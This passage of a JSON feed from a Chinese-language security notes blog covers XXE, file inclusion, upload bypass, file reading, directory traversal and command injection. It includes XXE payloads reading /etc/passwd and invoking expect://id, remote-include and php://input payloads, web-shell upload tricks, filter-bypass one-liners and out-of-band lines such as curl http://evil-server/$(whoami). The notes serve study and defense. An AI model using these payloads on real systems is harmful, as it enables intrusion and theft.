doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">data</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">data</span> <span class=\"token attr-name\">(#ANY)</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&file;\">&amp;file;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h2 id=\"ssrf\"><a class=\"anchor\" href=\"#ssrf\">#</a> SSRF</h2>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\"?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">data</span> <span class=\"token name\">SYSTEM</span> <span class=\"token string\">\"http://publicServer.com/\"</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">data</span> <span class=\"token attr-name\">(#ANY)</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span><span class=\"token punctuation\">></span></span>4<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h2 id=\"rce\"><a class=\"anchor\" href=\"#rce\">#</a> RCE</h2>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\"?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">GVI</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">foo</span> <span class=\"token attr-name\">ANY</span> <span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;!ENTITY xxe SYSTEM \"expect://id\" ></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>catalog</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>core</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>test101<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>description</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>description</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>core</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>catalog</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h2 id=\"xinclude\"><a class=\"anchor\" href=\"#xinclude\">#</a> XInclude</h2>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version='1.0'?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span> <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>xi</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/2001/XInclude<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">xi:</span>include</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://publicServer.com/file.xml<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span><span class=\"token namespace\">xi:</span>include</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy53M3NjaG9vbC5jb20uY24veG1sLw==\">XML 教程</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWN1cml0eS50ZW5jZW50LmNvbS9pbmRleC5waHAvYmxvZy9tc2cvNjk=\">未知攻焉知防 XXE 漏洞攻防</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvOTc4MzMuaHRtbA==\">XXE 攻击笔记分享</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjg4Nw==\">从 XML 相关一步一步到 XXE 漏洞</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "XXE",
                "XML"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/",
            "title": "文件包含",
            "date_published": "2022-11-26T13:02:44.000Z",
            "content_html": "<h2 id=\"基础\"><a class=\"anchor\" href=\"#基础\">#</a> 基础</h2>\n<p>常见的文件包含漏洞的形式为  <code>&lt;?php include(&quot;inc/&quot; . $_GET['file']); ?&gt;</code></p>\n<p>考虑常用的几种包含方式为</p>\n<ul>\n<li>同目录包含  <code>file=.htaccess</code></li>\n<li>目录遍历  <code>?file=../../../../../../../../../var/lib/locate.db</code></li>\n<li>日志注入  <code>?file=../../../../../../../../../var/log/apache/error.log</code></li>\n<li>利用  <code>/proc/self/environ</code></li>\n</ul>\n<p>其中日志可以使用 SSH 日志或者 Web 日志等多种日志来源测试</p>\n<h2 id=\"触发sink\"><a class=\"anchor\" href=\"#触发sink\">#</a> 触发 Sink</h2>\n<ul>\n<li>PHP\n<ul>\n<li>include\n<ul>\n<li>在包含过程中出错会报错，不影响执行后续语句</li>\n</ul>\n</li>\n<li>include_once\n<ul>\n<li>仅包含一次</li>\n</ul>\n</li>\n<li>require\n<ul>\n<li>在包含过程中出错，就会直接退出，不执行后续语句</li>\n</ul>\n</li>\n<li>require_once</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"绕过技巧\"><a class=\"anchor\" href=\"#绕过技巧\">#</a> 绕过技巧</h2>\n<p>常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式</p>\n<h3 id=\"url编码绕过\"><a class=\"anchor\" href=\"#url编码绕过\">#</a> url 编码绕过</h3>\n<p>如果 WAF 中是字符串匹配，可以使用 url 多次编码的方式可以绕过</p>\n<h3 id=\"特殊字符绕过\"><a class=\"anchor\" href=\"#特殊字符绕过\">#</a> 特殊字符绕过</h3>\n<ul>\n<li>某些情况下，读文件支持使用 Shell 通配符，如  <code>?</code>   <code>*</code>  等</li>\n<li>url 中 使用  <code>?</code>   <code>#</code>  可能会影响 include 包含的结果</li>\n<li>某些情况下，unicode 编码不同但是字形相近的字符有同一个效果</li>\n</ul>\n<h3 id=\"00截断\"><a class=\"anchor\" href=\"#00截断\">#</a> %00 截断</h3>\n<p>几乎是最常用的方法，条件是  <code>magic_quotes_gpc</code>  关闭，而且 php 版本小于 5.3.4。</p>\n<h3 id=\"长度截断\"><a class=\"anchor\" href=\"#长度截断\">#</a> 长度截断</h3>\n<p>Windows 上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为 259 个 bytes。</p>\n<p>msdn 定义  <code>#define MAX_PATH 260</code> ，其中第 260 个字符为字符串结尾的  <code>\\0</code>  ，而 linux 可以用 getconf 来判断文件名长度限制和文件路径长度限制。</p>\n<p>获取最长文件路径长度：getconf PATH_MAX /root 得到 4096 获取最长文件名：getconf NAME_MAX /root 得到 255</p>\n<p>那么在长度有限的时候， <code>././././</code>  (n 个) 的形式就可以通过这个把路径爆掉</p>\n<p>在 php 代码包含中，这种绕过方式要求 php 版本 &lt; php 5.2.8</p>\n<h3 id=\"伪协议绕过\"><a class=\"anchor\" href=\"#伪协议绕过\">#</a> 伪协议绕过</h3>\n<ul>\n<li>远程包含：要求  <code>allow_url_fopen=On</code>  且  <code>allow_url_include=On</code>  ， payload 为  <code>?file=[http|https|ftp]://websec.wordpress.com/shell.txt</code>  的形式</li>\n<li>PHP input: 把 payload 放在 POST 参数中作为包含的文件，要求  <code>allow_url_include=On</code>  ，payload 为  <code>?file=php://input</code>  的形式</li>\n<li>Base64: 使用 Base64 伪协议读取文件，payload 为  <code>?file=php://filter/convert.base64-encode/resource=index.php</code>  的形式</li>\n<li>data: 使用 data 伪协议读取文件，payload 为  <code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</code>  的形式，要求  <code>allow_url_include=On</code></li>\n</ul>\n<h3 id=\"协议绕过\"><a class=\"anchor\" href=\"#协议绕过\">#</a> 协议绕过</h3>\n<p><code>allow_url_fopen</code>  和  <code>allow_url_include</code>  主要是针对  <code>http</code>   <code>ftp</code>  两种协议起作用，因此可以使用 SMB、WebDav 协议等方式来绕过限制。</p>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2R4eS5tZS8/cD03NTI=\">Exploit with PHP Protocols</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGZpLWNoZWF0LXNoZWV0Lw==\">lfi cheat sheet</span></li>\n</ul>\n",
            "tags": [
                "包含",
                "文件",
                "目录"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/uploadfile/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/uploadfile/",
            "title": "文件上传",
            "date_published": "2022-11-26T12:58:44.000Z",
            "content_html": "<h1 id=\"文件类型检测绕过\"><a class=\"anchor\" href=\"#文件类型检测绕过\">#</a> 文件类型检测绕过</h1>\n<h2 id=\"更改请求绕过\"><a class=\"anchor\" href=\"#更改请求绕过\">#</a> 更改请求绕过</h2>\n<p>有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。 同样的，有的站点在后端仅检查了 HTTP Header 中的信息，比如  <code>Content-Type</code>  等，这种检查同样可以通过修改网络请求绕过。</p>\n<h2 id=\"magic检测绕过\"><a class=\"anchor\" href=\"#magic检测绕过\">#</a> Magic 检测绕过</h2>\n<p>有的站点使用文件头来检测文件类型，这种检查可以在 Shell 前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示</p>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>十六进制值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>JPG</td>\n<td>FF D8 FF E0 00 10 4A 46 49 46</td>\n</tr>\n<tr>\n<td>GIF</td>\n<td>47 49 46 38 39 61</td>\n</tr>\n<tr>\n<td>PNG</td>\n<td>89 50 4E 47</td>\n</tr>\n<tr>\n<td>TIF</td>\n<td>49 49 2A 00</td>\n</tr>\n<tr>\n<td>BMP</td>\n<td>42 4D</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"后缀绕过\"><a class=\"anchor\" href=\"#后缀绕过\">#</a> 后缀绕过</h2>\n<p>部分服务仅根据后缀、上传时的信息或 Magic Header 来判断文件类型，此时可以绕过。</p>\n<p>php 由于历史原因，部分解释器可能支持符合正则  <code>/ph(p[2-7]?|t(ml)?)/</code>  的后缀，如  <code>php</code>  /  <code>php5</code>  /  <code>pht</code>  /  <code>phtml</code>  /  <code>shtml</code>  /  <code>pwml</code>  /  <code>phtm</code>  等 可在禁止上传 php 文件时测试该类型。</p>\n<p>jsp 引擎则可能会解析  <code>jspx</code>  /  <code>jspf</code>  /  <code>jspa</code>  /  <code>jsw</code>  /  <code>jsv</code>  /  <code>jtml</code>  等后缀，asp 支持  <code>asa</code>  /  <code>asax</code>  /  <code>cer</code>  /  <code>cdx</code>  /  <code>aspx</code>  /  <code>ascx</code>  /  <code>ashx</code>  /  <code>asmx</code>  /  <code>asp&#123;80-90&#125;</code>  等后缀。</p>\n<p>除了这些绕过，其他的后缀同样可能带来问题，如  <code>vbs</code>  /  <code>asis</code>  /  <code>sh</code>  /  <code>reg</code>  /  <code>cgi</code>  /  <code>exe</code>  /  <code>dll</code>  /  <code>com</code>  /  <code>bat</code>  /  <code>pl</code>  /  <code>cfc</code>  /  <code>cfm</code>  /  <code>ini</code>  等。</p>\n<h2 id=\"系统命名绕过\"><a class=\"anchor\" href=\"#系统命名绕过\">#</a> 系统命名绕过</h2>\n<p>在 Windows 系统中，上传  <code>index.php.</code>  会重命名为  <code>.</code>  ，可以绕过后缀检查。 也可尝试  <code>index.php%20</code>  ，  <code>index.php:1.jpg</code>   <code>index.php::$DATA</code>  等。 在 Linux 系统中，可以尝试上传名为  <code>index.php/.</code>  或  <code>./aa/../index.php/.</code>  的文件</p>\n<h2 id=\"userini\"><a class=\"anchor\" href=\"#userini\">#</a> .user.ini</h2>\n<p>在 php 执行的过程中，除了主  <code>php.ini</code>  之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER ['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。  <code>.user.ini</code>  中可以定义除了 PHP_INI_SYSTEM 以外的模式的选项，故可以使用  <code>.user.ini</code>  加上非 php 后缀的文件构造一个 shell，比如  <code>auto_prepend_file=01.gif</code>  。</p>\n<h2 id=\"waf绕过\"><a class=\"anchor\" href=\"#waf绕过\">#</a> WAF 绕过</h2>\n<p>有的 waf 在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。</p>\n<p>另外，Waf 和 Web 系统对  <code>boundary</code>  的处理不一致，可以使用错误的  <code>boundary</code>  来完成绕过。</p>\n<h2 id=\"竞争上传绕过\"><a class=\"anchor\" href=\"#竞争上传绕过\">#</a> 竞争上传绕过</h2>\n<p>有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成 Web Shell 的文件并尝试访问，多次之后即可获得 Shell。</p>\n<h1 id=\"攻击技巧\"><a class=\"anchor\" href=\"#攻击技巧\">#</a> 攻击技巧</h1>\n<h2 id=\"apache重写getshell\"><a class=\"anchor\" href=\"#apache重写getshell\">#</a> Apache 重写 GetShell</h2>\n<p>Apache 可根据是否允许重定向考虑上传.htaccess</p>\n<p>内容为</p>\n<pre><code>AddType application/x-httpd-php .png\nphp_flag engine 1\n</code></pre>\n<p>就可以用 png 或者其他后缀的文件做 php 脚本了</p>\n<h2 id=\"软链接任意读文件\"><a class=\"anchor\" href=\"#软链接任意读文件\">#</a> 软链接任意读文件</h2>\n<p>上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件 若服务器没有做好防护，可实现任意文件读取的效果</p>\n<h1 id=\"防护技巧\"><a class=\"anchor\" href=\"#防护技巧\">#</a> 防护技巧</h1>\n<ul>\n<li>使用白名单限制上传文件的类型</li>\n<li>使用更严格的文件类型检查方式</li>\n<li>限制 Web Server 对上传文件夹的解析</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4ODQ2NC5odG1s\">构造优质上传漏洞 Fuzz 字典</span></li>\n</ul>\n",
            "tags": [
                "目录",
                "上传"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/readfile/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/readfile/",
            "title": "文件读取",
            "date_published": "2022-11-26T12:49:44.000Z",
            "content_html": "<p>考虑读取可能有敏感信息的文件</p>\n<ul>\n<li>用户目录下的敏感文件\n<ul>\n<li>.bash_history</li>\n<li>.zsh_history</li>\n<li>.profile</li>\n<li>.bashrc</li>\n<li>.gitconfig</li>\n<li>.viminfopasswd</li>\n</ul>\n</li>\n<li>应用的配置文件\n<ul>\n<li>/etc/apache2/apache2.conf</li>\n<li>/etc/nginx/nginx.conf</li>\n</ul>\n</li>\n<li>应用的日志文件\n<ul>\n<li>/var/log/apache2/access.log</li>\n<li>/var/log/nginx/access.log</li>\n</ul>\n</li>\n<li>站点目录下的敏感文件\n<ul>\n<li>.svn/entries</li>\n<li>.git/HEAD</li>\n<li>WEB-INF/web.xml</li>\n<li>.htaccess</li>\n</ul>\n</li>\n<li>特殊的备份文件\n<ul>\n<li>.swp</li>\n<li>.swo</li>\n<li>.bak</li>\n<li>index.php~</li>\n<li>...</li>\n</ul>\n</li>\n<li>Python 的 Cache\n<ul>\n<li><code>__pycache__\\__init__.cpython-35.pyc</code></li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "目录",
                "读取"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/directory%20traversal/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/directory%20traversal/",
            "title": "目录穿越",
            "date_published": "2022-11-26T12:44:44.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>目录穿越（也被称为目录遍历 /directory traversal/path traversal）是通过使用  <code>../</code>  等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。</p>\n<h1 id=\"攻击载荷\"><a class=\"anchor\" href=\"#攻击载荷\">#</a> 攻击载荷</h1>\n<h2 id=\"url参数\"><a class=\"anchor\" href=\"#url参数\">#</a> URL 参数</h2>\n<ul>\n<li><code>../</code></li>\n<li><code>..\\</code></li>\n<li><code>..;/</code></li>\n</ul>\n<h2 id=\"nginx-off-by-slash\"><a class=\"anchor\" href=\"#nginx-off-by-slash\">#</a> Nginx Off by Slash</h2>\n<ul>\n<li><code>https://vuln.site.com/files../</code></li>\n</ul>\n<h2 id=\"unc-bypass\"><a class=\"anchor\" href=\"#unc-bypass\">#</a> UNC Bypass</h2>\n<ul>\n<li><code>\\\\localhost\\c$\\windows\\win.ini</code></li>\n</ul>\n<h1 id=\"过滤绕过\"><a class=\"anchor\" href=\"#过滤绕过\">#</a> 过滤绕过</h1>\n<ul>\n<li>\n<p>单次替换</p>\n<ul>\n<li><code>...//</code></li>\n</ul>\n</li>\n<li>\n<p>URL 编码</p>\n</li>\n<li>\n<p>16 位 Unicode 编码</p>\n<ul>\n<li><code>\\u002e</code></li>\n</ul>\n</li>\n<li>\n<p>超长 UTF-8 编码</p>\n<ul>\n<li><code>\\%e0%40%ae</code></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h1>\n<p>在进行文件操作相关的 API 前，应该对用户输入做过滤。较强的规则下可以使用白名单，仅允许纯字母或数字字符等。</p>\n<p>若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2ZpbGUtcGF0aC10cmF2ZXJzYWw=\">Directory traversal by portswigger</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9QYXRoX1RyYXZlcnNhbA==\">Path Traversal by OWASP</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9ncy5tc2RuLm1pY3Jvc29mdC5jb20vamVyZW15a3VobmUvMjAxNi8wNC8yMS9wYXRoLW5vcm1hbGl6YXRpb24v\">path normalization</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmJsYWNraGF0LmNvbS91cy0xOC9XZWQtQXVndXN0LTgvdXMtMTgtT3JhbmdlLVRzYWktQnJlYWtpbmctUGFyc2VyLUxvZ2ljLVRha2UtWW91ci1QYXRoLU5vcm1hbGl6YXRpb24tT2ZmLUFuZC1Qb3AtMGRheXMtT3V0LTIucGRm\">Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out defcon</span></li>\n</ul>\n",
            "tags": [
                "绕过",
                "遍历"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/",
            "title": "命令注入",
            "date_published": "2022-11-26T09:30:44.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>命令注入通常因为指 Web 应用在服务器上拼接系统命令而造成的漏洞。</p>\n<p>该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些 Web 管理界面的配置主机名 / IP / 掩码 / 网关、查看系统信息以及关闭重启等功能，或者一些站点提供如 ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。</p>\n<h1 id=\"常见危险函数\"><a class=\"anchor\" href=\"#常见危险函数\">#</a> 常见危险函数</h1>\n<h2 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> PHP</h2>\n<ul>\n<li>system</li>\n<li>exec</li>\n<li>passthru</li>\n<li>shell_exec</li>\n<li>popen</li>\n<li>proc_open</li>\n</ul>\n<h2 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> Python</h2>\n<ul>\n<li>system</li>\n<li>popen</li>\n<li>subprocess.call</li>\n<li>spawn</li>\n</ul>\n<h2 id=\"java\"><a class=\"anchor\" href=\"#java\">#</a> Java</h2>\n<ul>\n<li>java.lang.Runtime.getRuntime().exec(command)</li>\n</ul>\n<h1 id=\"常见注入方式\"><a class=\"anchor\" href=\"#常见注入方式\">#</a> 常见注入方式</h1>\n<ul>\n<li>分号分割</li>\n<li><code>||</code>   <code>&amp;&amp;</code>   <code>&amp;</code>  分割</li>\n<li><code>|</code>  管道符</li>\n<li><code>\\r\\n</code>   <code>%d0%a0</code>  换行</li>\n<li>反引号解析</li>\n<li><code>$()</code>  替换</li>\n</ul>\n<h1 id=\"无回显技巧\"><a class=\"anchor\" href=\"#无回显技巧\">#</a> 无回显技巧</h1>\n<ul>\n<li>\n<p>bash 反弹 shell</p>\n</li>\n<li>\n<p>DNS 带外数据</p>\n</li>\n<li>\n<p>http 带外</p>\n<ul>\n<li><code>curl http://evil-server/$(whoami)</code></li>\n<li><code>wget http://evil-server/$(whoami)</code></li>\n</ul>\n</li>\n<li>\n<p>无带外时利用  <code>sleep</code>  或其他逻辑构造布尔条件</p>\n</li>\n</ul>\n<h1 id=\"常见绕过方式\"><a class=\"anchor\" href=\"#常见绕过方式\">#</a> 常见绕过方式</h1>\n<h2 id=\"空格绕过\"><a class=\"anchor\" href=\"#空格绕过\">#</a> 空格绕过</h2>\n<ul>\n<li><code>&lt;</code>  符号  <code>cat&lt;123</code></li>\n<li><code>\\t</code>  /  <code>%09</code></li>\n<li><code>$&#123;IFS&#125;</code>   其中 {} 用来截断，比如 <code>cat$IFS2</code>  会被认为 IFS2 是变量名。另外，在后面加个 $ 可以起到截断的作用，一般用 $9，因为 $9 是当前系统 shell 进程的第九个参数的持有者，它始终为空字符串</li>\n</ul>\n<h2 id=\"黑名单绕过\"><a class=\"anchor\" href=\"#黑名单绕过\">#</a> 黑名单绕过</h2>\n<ul>\n<li><code>a=l;b=s;$a$b</code></li>\n<li>base64  <code>echo &quot;bHM=&quot; | base64 -d</code></li>\n<li><code>/?in/?s</code>  =&gt;  <code>/bin/ls</code></li>\n<li>连接符  <code>cat /etc/pass'w'd</code></li>\n<li>未定义的初始化变量  <code>cat$x /etc/passwd</code></li>\n</ul>\n<h2 id=\"长度限制绕过\"><a class=\"anchor\" href=\"#长度限制绕过\">#</a> 长度限制绕过</h2>\n<pre><code>&gt;wget\\\n&gt;foo.\\\n&gt;com\nls -t&gt;a\nsh a\n</code></pre>\n<p>上面的方法为通过命令行重定向写入命令，接着通过 ls 按时间排序把命令写入文件，最后执行 直接在 Linux 终端下执行的话，创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如 w,[之类的短命令，(使用 ls /usr/bin/? 查看) 如果不添加命令，需要 Ctrl+D 才能结束，这样就等于标准输入流的重定向 而在 php 中，使用 shell_exec 等执行系统命令的函数的时候，是不存在标准输入流的，所以可以直接创建文件</p>\n<h1 id=\"常用符号\"><a class=\"anchor\" href=\"#常用符号\">#</a> 常用符号</h1>\n<h2 id=\"命令分隔符\"><a class=\"anchor\" href=\"#命令分隔符\">#</a> 命令分隔符</h2>\n<ul>\n<li><code>%0a</code>  /  <code>%0d</code>  /  <code>\\n</code>  /  <code>\\r</code></li>\n<li><code>;</code></li>\n<li><code>&amp;</code>  /  <code>&amp;&amp;</code></li>\n</ul>\n<h2 id=\"通配符\"><a class=\"anchor\" href=\"#通配符\">#</a> 通配符</h2>\n<ul>\n<li><code>*</code>  0 到无穷个任意字符</li>\n<li><code>?</code>  一个任意字符</li>\n<li><code>[ ]</code>  一个在括号内的字符，e.g.  <code>[abcd]</code></li>\n<li><code>[ - ]</code>  在编码顺序内的所有字符</li>\n<li><code>[^ ]</code>  一个不在括号内的字符</li>\n</ul>\n<h1 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h1>\n<ul>\n<li>\n<p>不使用时禁用相应函数</p>\n</li>\n<li>\n<p>尽量不要执行外部的应用程序或命令</p>\n</li>\n<li>\n<p>做输入的格式检查</p>\n</li>\n<li>\n<p>转义命令中的所有 shell 元字符</p>\n<ul>\n<li>shell 元字符包括  <code>#&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\\</code></li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "注入",
                "函数",
                "绕过"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/",
            "title": "SSRF",
            "date_published": "2022-11-26T08:59:44.000Z",
